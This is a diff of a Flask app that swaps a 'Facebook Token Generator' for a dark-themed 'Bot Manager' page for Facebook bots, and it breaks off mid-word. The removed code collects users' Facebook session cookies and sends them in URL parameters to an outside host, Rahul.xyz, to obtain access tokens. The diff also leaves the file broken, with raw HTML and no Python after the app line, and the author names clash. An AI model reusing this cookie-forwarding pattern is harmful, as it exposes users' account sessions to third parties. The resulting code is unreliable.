@@ -3,361 +3,656 @@ import requests
 
 app = Flask(__name__)
 
-HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Token Generator | by Rahul Don</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <title>Bot Manager | Rahul don</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
     <style>
         :root {
-            --primary: #4361ee;
-            --primary-dark: #3a56d4;
-            --secondary: #3f37c9;
-            --light: #f8f9fa;
-            --dark: #212529;
-            --success: #4cc9f0;
-            --danger: #f72585;
-            --warning: #f8961e;
+            --primary: #7c3aed;
+            --primary-dark: #5b21b6;
+            --primary-light: #8b5cf6;
+            --dark: #0f172a;
+            --darker: #020617;
+            --dark-light: #1e293b;
+            --light: #f8fafc;
+            --gray: #94a3b8;
+            --gray-light: #cbd5e1;
+            --success: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --glass: rgba(15, 23, 42, 0.7);
         }
         
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
         }
         
         body {
-            font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            background-color: var(--darker);
+            color: var(--light);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
+            background-image: radial-gradient(circle at 10% 20%, rgba(28, 28, 28, 0.1) 0%, rgba(15, 23, 42, 0.8) 90%);
         }
         
-        .container {
-            max-width: 800px;
-            margin: 2rem auto;
-            padding: 2rem;
-            background: white;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            position: relative;
-            overflow: hidden;
-            z-index: 1;
-        }
-        
-        .container::before {
-            content: "";
-            position: absolute;
+        /* Header */
+        .header {
+            background-color: var(--glass);
+            backdrop-filter: blur(12px);
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
             top: 0;
-            left: 0;
-            width: 100%;
-            height: 8px;
-            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            z-index: 100;
+            border-bottom: 1px solid rgba(148, 163, 184, 0.1);
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
         }
         
-        h1 {
-            color: var(--primary);
-            text-align: center;
-            margin-bottom: 1.5rem;
+        .header-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--light);
+            background: linear-gradient(to right, var(--primary), var(--primary-light));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .menu-toggle {
+            width: 40px;
+            height: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            gap: 6px;
+            transition: all 0.3s ease;
+            border-radius: 50%;
+        }
+        
+        .menu-toggle:hover {
+            background-color: rgba(148, 163, 184, 0.1);
+        }
+        
+        .menu-toggle span {
+            display: block;
+            width: 24px;
+            height: 2px;
+            background-color: var(--light);
+            transition: all 0.3s ease;
+        }
+        
+        .menu-toggle.active span:nth-child(1) {
+            transform: translateY(8px) rotate(45deg);
+        }
+        
+        .menu-toggle.active span:nth-child(2) {
+            opacity: 0;
+        }
+        
+        .menu-toggle.active span:nth-child(3) {
+            transform: translateY(-8px) rotate(-45deg);
+        }
+        
+        /* Sidebar */
+        .sidebar {
+            position: fixed;
+            top: 0;
+            right: -320px;
+            width: 320px;
+            height: 100vh;
+            background-color: var(--dark);
+            z-index: 90;
+            transition: right 0.3s ease;
+            padding: 1.5rem;
+            border-left: 1px solid rgba(148, 163, 184, 0.1);
+            box-shadow: -10px 0 30px rgba(0, 0, 0, 0.2);
+        }
+        
+        .sidebar.active {
+            right: 0;
+        }
+        
+        .sidebar-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid rgba(148, 163, 184, 0.1);
+        }
+        
+        .sidebar-title {
+            font-size: 1.25rem;
             font-weight: 600;
+            color: var(--primary-light);
+        }
+        
+        .sidebar-close {
+            background: none;
+            border: none;
+            color: var(--gray);
+            font-size: 1.5rem;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            width: 36px;
+            height: 36px;
             display: flex;
             align-items: center;
             justify-content: center;
+            border-radius: 50%;
+        }
+        
+        .sidebar-close:hover {
+            background-color: rgba(148, 163, 184, 0.1);
+            color: var(--light);
+        }
+        
+        .sidebar-menu {
+            display: flex;
+            flex-direction: column;
             gap: 0.5rem;
         }
         
-        .form-group {
-            margin-bottom: 1.5rem;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 0.5rem;
-            color: var(--dark);
+        .sidebar-item {
+            padding: 0.75rem 1rem;
+            border-radius: 0.5rem;
+            color: var(--gray-light);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            transition: all 0.2s ease;
             font-weight: 500;
         }
         
-        textarea {
+        .sidebar-item i {
+            width: 24px;
+            text-align: center;
+            font-size: 1rem;
+        }
+        
+        .sidebar-item:hover {
+            background-color: rgba(148, 163, 184, 0.1);
+            color: var(--light);
+            transform: translateX(5px);
+        }
+        
+        .sidebar-item.active {
+            background-color: var(--primary);
+            color: white;
+            box-shadow: 0 4px 15px rgba(123, 97, 255, 0.3);
+        }
+        
+        /* Main Content */
+        .main {
+            flex: 1;
+            padding: 2rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        /* Cards */
+        .card {
+            background-color: var(--glass);
+            backdrop-filter: blur(12px);
+            border-radius: 1rem;
+            padding: 2rem;
             width: 100%;
-            padding: 1rem;
-            border: 2px solid #e9ecef;
-            border-radius: 8px;
-            min-height: 120px;
-            font-family: inherit;
-            resize: vertical;
+            max-width: 700px;
+            margin-bottom: 1.5rem;
+            border: 1px solid rgba(148, 163, 184, 0.1);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+        }
+        
+        .card-title {
+            font-size: 1.25rem;
+            font-weight: 600;
+            margin-bottom: 1.5rem;
+            color: var(--light);
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+        
+        .card-title i {
+            color: var(--primary-light);
+        }
+
+        /* Owner Profile Section */
+        .owner-profile {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            margin-bottom: 2rem;
+            padding-bottom: 1.5rem;
+            border-bottom: 1px solid rgba(148, 163, 184, 0.1);
+        }
+
+        .owner-avatar {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 4px solid var(--primary);
+            box-shadow: 0 0 0 6px rgba(123, 97, 255, 0.3);
+            margin-bottom: 1rem;
+            transition: transform 0.3s ease;
+        }
+
+        .owner-avatar:hover {
+            transform: scale(1.05);
+        }
+
+        .owner-name {
+            font-size: 1.75rem;
+            font-weight: 700;
+            color: var(--primary-light);
+            margin-bottom: 0.5rem;
+        }
+
+        .owner-bio {
+            font-size: 0.9375rem;
+            color: var(--gray-light);
+            line-height: 1.6;
+            max-width: 500px;
+            margin: 0 auto 1.5rem auto;
+        }
+        
+        /* Form Elements */
+        .form-group {
+            margin-bottom: 1.25rem;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-size: 0.875rem;
+            color: var(--gray-light);
+            font-weight: 500;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 0.875rem 1.25rem;
+            background-color: rgba(148, 163, 184, 0.05);
+            border: 1px solid rgba(148, 163, 184, 0.1);
+            border-radius: 0.75rem;
+            color: var(--light);
+            font-size: 0.9375rem;
             transition: all 0.3s ease;
         }
         
-        textarea:focus {
+        .form-control:focus {
             outline: none;
             border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.2);
+            box-shadow: 0 0 0 3px rgba(123, 97, 255, 0.2);
+            background-color: rgba(123, 97, 255, 0.05);
+        }
+        
+        textarea.form-control {
+            min-height: 120px;
+            resize: vertical;
         }
         
         .btn {
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            color: white;
-            border: none;
-            padding: 0.8rem 1.5rem;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 1rem;
-            font-weight: 500;
             display: inline-flex;
             align-items: center;
             justify-content: center;
-            gap: 0.5rem;
+            padding: 0.875rem 1.75rem;
+            border-radius: 0.75rem;
+            font-size: 0.9375rem;
+            font-weight: 600;
+            cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            border: none;
+            gap: 0.5rem;
         }
         
-        .btn:hover {
-            background: linear-gradient(135deg, var(--primary-dark), var(--secondary));
+        .btn-primary {
+            background-color: var(--primary);
+            color: white;
+            box-shadow: 0 4px 15px rgba(123, 97, 255, 0.3);
+        }
+        
+        .btn-primary:hover {
+            background-color: var(--primary-dark);
             transform: translateY(-2px);
-            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 6px 20px rgba(123, 97, 255, 0.4);
         }
         
-        .btn:active {
-            transform: translateY(0);
+        .btn-block {
+            display: block;
+            width: 100%;
         }
         
-        .result {
-            margin-top: 2rem;
-            padding: 1.5rem;
-            border-radius: 8px;
-            background-color: var(--light);
-            border-left: 4px solid var(--primary);
-            animation: fadeIn 0.5s ease;
+        .text-link {
+            color: var(--primary-light);
+            text-decoration: none;
+            font-size: 0.875rem;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-weight: 500;
         }
         
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
+        .text-link:hover {
+            text-decoration: underline;
+            color: var(--primary);
         }
         
-        .result.success {
-            border-left-color: var(--success);
+        .text-center {
+            text-align: center;
         }
         
-        .result.error {
-            border-left-color: var(--danger);
+        .mt-3 {
+            margin-top: 1.5rem;
         }
-        
-        .token-info {
-            word-break: break-all;
-            margin-top: 1rem;
-        }
-        
-        .token-info p {
+
+        .mb-1 {
             margin-bottom: 0.5rem;
         }
-        
-        .token-info strong {
-            color: var(--dark);
+
+        .mb-3 {
+            margin-bottom: 1.5rem;
         }
         
-        .profile-pic {
-            width: 80px;
-            height: 80px;
+        /* Command List */
+        .command-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 1.25rem;
+            margin-top: 1.5rem;
+        }
+        
+        .command-card {
+            background-color: rgba(148, 163, 184, 0.05);
+            border-radius: 0.75rem;
+            padding: 1.25rem;
+            border: 1px solid rgba(148, 163, 184, 0.1);
+            transition: all 0.3s ease;
+        }
+        
+        .command-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            border-color: var(--primary-light);
+        }
+        
+        .command-name {
+            font-weight: 600;
+            margin-bottom: 0.75rem;
+            color: var(--primary-light);
+            font-size: 1.0625rem;
+        }
+        
+        .command-description {
+            font-size: 0.8125rem;
+            color: var(--gray-light);
+            margin-bottom: 0.75rem;
+            line-height: 1.5;
+        }
+        
+        .command-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+            margin-top: 0.75rem;
+        }
+        
+        .command-tag {
+            font-size: 0.6875rem;
+            padding: 0.25rem 0.75rem;
+            border-radius: 999px;
+            background-color: rgba(148, 163, 184, 0.1);
+            color: var(--gray-light);
+            font-weight: 500;
+        }
+        
+        /* Online Users */
+        .user-list {
+            display: flex;
+            flex-direction: column;
+            gap: 1.25rem;
+            margin-top: 1.5rem;
+        }
+        
+        .user-card {
+            display: flex;
+            align-items: center;
+            padding: 1rem;
+            background-color: rgba(148, 163, 184, 0.05);
+            border-radius: 0.75rem;
+            border: 1px solid rgba(148, 163, 184, 0.1);
+            transition: all 0.3s ease;
+        }
+        
+        .user-card:hover {
+            transform: translateX(5px);
+            border-color: var(--primary-light);
+        }
+        
+        .user-avatar {
+            width: 48px;
+            height: 48px;
             border-radius: 50%;
             object-fit: cover;
-            margin: 0.5rem 0;
-            border: 3px solid var(--primary);
+            margin-right: 1.25rem;
+            border: 2px solid var(--primary-light);
         }
         
-        footer {
-            text-align: center;
-            padding: 1.5rem;
-            margin-top: auto;
-            color: var(--dark);
-            font-size: 0.9rem;
+        .user-info {
+            flex: 1;
         }
         
-        footer a {
-            color: var(--primary);
-            text-decoration: none;
-            font-weight: 500;
-            display: inline-flex;
+        .user-name {
+            font-weight: 600;
+            font-size: 0.9375rem;
+            margin-bottom: 0.25rem;
+            color: var(--light);
+        }
+        
+        .user-id {
+            font-size: 0.75rem;
+            color: var(--gray);
+            margin-bottom: 0.25rem;
+            word-break: break-all;
+        }
+        
+        .user-uptime {
+            font-size: 0.75rem;
+            color: var(--success);
+            display: flex;
             align-items: center;
-            gap: 0.3rem;
+            gap: 0.25rem;
         }
         
-        footer a:hover {
-            text-decoration: underline;
-        }
-        
-        .svg-icon {
-            width: 20px;
-            height: 20px;
-            fill: currentColor;
-        }
-        
-        .features {
+        /* Stats */
+        .stats-container {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            grid-template-columns: repeat(2, 1fr);
             gap: 1rem;
-            margin: 2rem 0;
+            margin-bottom: 1.5rem;
         }
         
-        .feature {
-            background: var(--light);
-            padding: 1rem;
-            border-radius: 8px;
+        .stat-card {
+            background-color: rgba(148, 163, 184, 0.05);
+            border-radius: 0.75rem;
+            padding: 1.25rem;
+            border: 1px solid rgba(148, 163, 184, 0.1);
             text-align: center;
         }
         
-        .feature svg {
-            width: 40px;
-            height: 40px;
-            margin-bottom: 0.5rem;
-            fill: var(--primary);
+        .stat-value {
+            font-size: 1.75rem;
+            font-weight: 700;
+            color: var(--primary-light);
+            margin-bottom: 0.25rem;
         }
         
+        .stat-label {
+            font-size: 0.8125rem;
+            color: var(--gray-light);
+        }
+        
+        /* Footer */
+        .footer {
+            background-color: var(--glass);
+            backdrop-filter: blur(12px);
+            padding: 1.5rem;
+            text-align: center;
+            border-top: 1px solid rgba(148, 163, 184, 0.1);
+            margin-top: auto;
+        }
+        
+        .footer-text {
+            color: var(--gray);
+            font-size: 0.875rem;
+        }
+        
+        .footer-author {
+            color: var(--primary-light);
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        /* Toastr Overrides */
+        .toast {
+            border-radius: 0.75rem !important;
+            padding: 1rem !important;
+            font-size: 0.875rem !important;
+            backdrop-filter: blur(10px) !important;
+            background-color: rgba(15, 23, 42, 0.9) !important;
+            border: 1px solid rgba(148, 163, 184, 0.1) !important;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2) !important;
+        }
+        
+        .toast-success {
+            color: var(--success) !important;
+        }
+        
+        .toast-error {
+            color: var(--danger) !important;
+        }
+        
+        .toast-info {
+            color: var(--primary-light) !important;
+        }
+        
+        .toast-warning {
+            color: var(--warning) !important;
+        }
+        
+        .toast-title {
+            font-weight: 600 !important;
+        }
+        
+        /* Responsive */
         @media (max-width: 768px) {
-            .container {
-                margin: 1rem;
+            .main {
                 padding: 1.5rem;
+            }
+            
+            .sidebar {
+                width: 280px;
+            }
+            
+            .command-list {
+                grid-template-columns: 1fr;
+            }
+            
+            .stats-container {
+                grid-template-columns: 1fr;
             }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="28" height="28" fill="#4361ee">
-                <path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z"/>
-            </svg>
-            Facebook Token Generator
-        </h1>
-        
-        <div class="features">
-            <div class="feature">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                    <path d="M12 15a3 3 0 100-6 3 3 0 000 6z"/><path fill-rule="evenodd" d="M1.323 11.447C2.811 6.976 7.028 3.75 12.001 3.75c4.97 0 9.185 3.223 10.675 7.69.12.362.12.752 0 1.113-1.487 4.471-5.705 7.697-10.677 7.697-4.97 0-9.186-3.223-10.675-7.69a1.762 1.762 0 010-1.113zM17.25 12a5.25 5.25 0 11-10.5 0 5.25 5.25 0 0110.5 0z" clip-rule="evenodd"/>
-                </svg>
-                <h3>Secure</h3>
-                <p>Your data is processed securely</p>
-            </div>
-            <div class="feature">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                    <path fill-rule="evenodd" d="M12 6.75a5.25 5.25 0 016.775-5.025.75.75 0 01.313 1.248l-3.32 3.319c.063.475.276.934.641 1.299.365.365.824.578 1.3.64l3.318-3.319a.75.75 0 011.248.313 5.25 5.25 0 01-5.472 6.756c-1.018-.086-1.87.1-2.309.634L7.344 21.3A3.298 3.298 0 112.7 16.657l8.684-7.151c.533-.44.72-1.291.634-2.309A5.342 5.342 0 0112 6.75zM4.117 19.125a.75.75 0 01.75-.75h.008a.75.75 0 01.75.75v.008a.75.75 0 01-.75.75h-.008a.75.75 0 01-.75-.75v-.008z" clip-rule="evenodd"/>
-                </svg>
-                <h3>Easy</h3>
-                <p>Simple and straightforward</p>
-            </div>
-            <div class="feature">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                    <path fill-rule="evenodd" d="M12 1.5a.75.75 0 01.75.75V4.5a.75.75 0 01-1.5 0V2.25A.75.75 0 0112 1.5zM5.636 4.136a.75.75 0 011.06 0l1.592 1.591a.75.75 0 01-1.061 1.06l-1.591-1.59a.75.75 0 010-1.061zm12.728 0a.75.75 0 010 1.06l-1.591 1.592a.75.75 0 01-1.06-1.061l1.59-1.591a.75.75 0 011.061 0zm-6.816 4.496a.75.75 0 01.82.311l5.228 7.917a.75.75 0 01-.777 1.148l-2.097-.43 1.045 3.9a.75.75 0 01-1.45.388l-1.044-3.899-1.601 1.42a.75.75 0 01-1.247-.606l.569-9.47a.75.75 0 01.554-.68zM3 10.5a.75.75 0 01.75-.75H6a.75.75 0 010 1.5H3.75A.75.75 0 013 10.5zm14.25 0a.75.75 0 01.75-.75h2.25a.75.75 0 010 1.5H18a.75.75 0 01-.75-.75zm-8.962 3.712a.75.75 0 010 1.061l-1.591 1.591a.75.75 0 11-1.061-1.06l1.591-1.592a.75.75 0 011.06 0z" clip-rule="evenodd"/>
-                </svg>
-                <h3>Fast</h3>
-                <p>Get your token instantly</p>
-            </div>
+    <header class="header">
+        <h1 class="header-title">Bot Manager</h1>
+        <div class="menu-toggle">
+            <span></span>
+            <span></span>
+            <span></span>
         </div>
-        
-        <form method="POST" action="/">
-            <div class="form-group">
-                <label for="cookies">Enter your Facebook cookies:</label>
-                <textarea id="cookies" name="cookies" placeholder="sb=abc123; datr=xyz456; c_user=12345; xs=abc123xyz456" required></textarea>
-            </div>
-            <button type="submit" class="btn">
-                <svg class="svg-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                    <path fill-rule="evenodd" d="M12 1.5a.75.75 0 01.75.75V4.5a.75.75 0 01-1.5 0V2.25A.75.75 0 0112 1.5zM5.636 4.136a.75.75 0 011.06 0l1.592 1.591a.75.75 0 01-1.061 1.06l-1.591-1.59a.75.75 0 010-1.061zm12.728 0a.75.75 0 010 1.06l-1.591 1.592a.75.75 0 01-1.06-1.061l1.59-1.591a.75.75 0 011.061 0zm-6.816 4.496a.75.75 0 01.82.311l5.228 7.917a.75.75 0 01-.777 1.148l-2.097-.43 1.045 3.9a.75.75 0 01-1.45.388l-1.044-3.899-1.601 1.42a.75.75 0 01-1.247-.606l.569-9.47a.75.75 0 01.554-.68zM3 10.5a.75.75 0 01.75-.75H6a.75.75 0 010 1.5H3.75A.75.75 0 013 10.5zm14.25 0a.75.75 0 01.75-.75h2.25a.75.75 0 010 1.5H18a.75.75 0 01-.75-.75zm-8.962 3.712a.75.75 0 010 1.061l-1.591 1.591a.75.75 0 11-1.061-1.06l1.591-1.592a.75.75 0 011.06 0z" clip-rule="evenodd"/>
-                </svg>
-                Generate Token
+    </header>
+    
+    <aside class="sidebar">
+        <div class="sidebar-header">
+            <h2 class="sidebar-title">Navigation</h2>
+            <button class="sidebar-close">
+                <i class="fas fa-times"></i>
             </button>
-        </form>
-
-        {% if result %}
-        <div class="result {% if result.access_token %}success{% else %}error{% endif %}">
-            {% if result.access_token %}
-                <h3>🎉 Success!</h3>
-                <div class="token-info">
-                    <p><strong>Access Token:</strong> {{ result.access_token }}</p>
-                    <p><strong>User ID:</strong> {{ result.user_id }}</p>
-                    <p><strong>Name:</strong> {{ result.name }}</p>
-                    {% if result.profile_picture %}
-                    <p><strong>Profile Picture:</strong></p>
-                    <img src="{{ result.profile_picture }}" alt="Profile" class="profile-pic">
-                    {% endif %}
-                </div>
-            {% else %}
-                <h3>❌ Error</h3>
-                <p><strong>Message:</strong> {{ result.error }}</p>
-                {% if result.details %}
-                <p><strong>Details:</strong> {{ result.details }}</p>
-                {% endif %}
-            {% endif %}
         </div>
-        {% endif %}
-    </div>
+        <nav class="sidebar-menu">
+            <a href="#" class="sidebar-item active" onclick="showSection('home')">
+                <i class="fas fa-home"></i>
+                <span>Home</span>
+            </a>
+            <a href="#" class="sidebar-item" onclick="showSection('create')">
+                <i class="fas fa-plus-circle"></i>
+                <span>Create Bot</span>
+            </a>
+            <a href="#" class="sidebar-item" onclick="showSection('login')">
+                <i class="fas fa-sign-in-alt"></i>
+                <span>Login</span>
+            </a>
+            <a href="#" class="sidebar-item" onclick="showSection('commands')">
+                <i class="fas fa-code"></i>
+                <span>Commands</span>
+            </a>
+            <a href="#" class="sidebar-item" onclick="showSection('online')">
+                <i class="fas fa-users"></i>
+                <span>Online Bots</span>
+            </a>
+        </nav>
+    </aside>
     
-    <footer>
-        <p>Developed with ❤️ by <a href="https://github.com/Sourav tiwari91" target="_blank">
-            <svg class="svg-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
-            </svg>
-            Rahul Don
-        </a></p>
-    </footer>
-</body>
-</html>
-"""
-
-def get_facebook_token(cookies):
-    """
-    Get Facebook access token and user details using cookies
-    
-    Args:
-        cookies (str): The Facebook cookies string
+    <main class="main">
         
-    Returns:
-        dict: Dictionary containing token, user info, or error message
-    """
-    url = "https://Rahul.xyz/api/facebook_token"
-    params = {'cookies': cookies}
-    
-    try:
-        response = requests.get(url, params=params)
-        if response.status_code == 200:
-            return response.json()
-        else:
-            return {
-                'error': f"API request failed with status code {response.status_code}",
-                'details': response.json()
-            }
-    except requests.exceptions.RequestException as e:
-        return {
-            'error': "Failed to connect to the API server",
-            'details': "Failed to connect to the API server"
-        }
-    except ValueError as e:
-        return {
-            'error': "Invalid JSON response from server",
-            'details': str(e)
-        }
+        <section id="home-section" class="card">
+            <div class="owner-profile">
+                <img src="https://github.com/K0J4.png" alt="Rahul DonProfile Picture" class="owner-avatar">
+                <h2 class="owner-name">ALi Koja</h2>
+                <p class="owner-bio">
+                    Hello! I'm ALi Koja, the developer behind Bot Manager. I'm passionate about creating efficient and user-friendly tools to simplify your bot management experience. My goal is to empower users with seamless control over their Facebook bots.
+                </p>
+            </div>
+            
+            <h3 class="card-title"><i class="fas fa-info-circle"></i> About Bot Manager</h3>
+            <p class="mb-3">Welcome to Bot Manager! This platform is designed to provide a comprehensive and intuitive solution for managing your Facebook bots, ensuring a smooth and powerful experience.</p>
+            
+            <hr style="border-color: rgba(148, 163, 184, 0.1); margin: 1.5rem 0;">
+            
+            <h3 class="card-title"><i class="fas fa-paper-plane"></i> Get in Touch</h3>
+            <p class="mb-1">If you have any questions, feedback, or need support, feel free to reach out:</p>
+            <ul style="list-style: none; padding: 0;">
+                <li style="margin-bottom: 0.5rem;"><i class="fas fa-envelope" style="margin-right: 0.5rem; color: var(--primary-light);"></i> Email: <a href="/cdn-cgi/l/email-protection#d5bcbbb3ba95bebabfb4adb1fbadacaf" class="text-link"><span class="__cf_email__" data-cfemail="90f9fef6ffd0fbfffaf1e8f4bee8e9ea">[email&#160;protected]</span></a></li>
+                <li><i class="fab fa-facebook" style="margin-right: 0.5rem; color: var(--primary-light);"></i> Facebook: <a href="https://www.facebook.com/mr.ali.koja.jutt" target="_blank" class="text-link">ALi Koja (Official Profile)</a></li>
+            </ul>
+        </section>
 
-@app.route('/', methods=['GET', 'POST'])
-def index():
-    result = None
-    if request.method == 'POST':
-        cookies = request.form.get('cookies', '').strip()
-        if cookies:
-            result = get_facebook_token(cookies)
-    
-    return render_template_string(HTML_TEMPLATE, result=result)
-
-@app.route('/api', methods=['POST'])
-def api():
-    cookies = request.json.get('cookies', '').strip()
-    if not cookies:
-        return jsonify({'error': 'No cookies provided'}), 400
-    
-    result = get_facebook_token(cookies)
-    return jsonify(result)
-
-if __name__ == '__main__':
-    app.run(debug=False, host='0.0.0.0', port=25670)
+        <section id="create-section" class="card" style="display: none;">
+            <h3 class="card-title"><i class="fas fa-plus-circle"></i> Cre
